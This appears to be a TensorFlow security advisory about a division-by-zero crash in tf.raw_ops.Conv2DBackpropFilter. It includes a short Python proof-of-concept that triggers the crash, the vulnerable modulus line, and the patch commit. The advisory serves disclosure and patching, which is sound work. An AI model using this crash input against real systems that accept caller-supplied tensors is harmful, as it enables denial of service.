An attacker can trigger a division by 0 in `tf.raw_ops.Conv2DBackpropFilter`. This is because the implementation(https://github.com/tensorflow/tensorflow/blob/496c2630e51c1a478f095b084329acedb253db6b/tensorflow/core/kernels/conv_grad_shape_utils.cc#L130) does a modulus operation where the divisor is controlled by the caller. The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\nFrom Github:\n### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.Conv2DBackpropFilter`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 1, 0], dtype=tf.float32)\nfilter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 0, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(input=input_tensor, filter_sizes=filter_sizes,\n                                out_backprop=out_backprop,\n                                strides=[1, 66, 18, 1], use_cudnn_on_gpu=True,\n                                padding='SAME', explicit_paddings=[],\n                                data_format='NHWC', dilations=[1, 1, 1, 1])\n```                 \n                    \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/496c2630e51c1a478f095b084329acedb253db6b/tensorflow/core/kernels/conv_grad_shape_utils.cc#L130) does a modulus operation where the divisor is controlled by the caller:\n\n```cc \n  if (dims->in_depth % filter_shape.dim_size(num_dims - 2)) { ... }\n```\n    \n### Patches\nWe have patched the issue in GitHub commit [fca9874a9b42a2134f907d2fb46ab774a831404a](https://github.com/tensorflow/tensorflow/commit/fca9874a9b42a2134f907d2fb46ab774a831404a).\n\nThe fix will be included in TensorFlow 2.5.0.
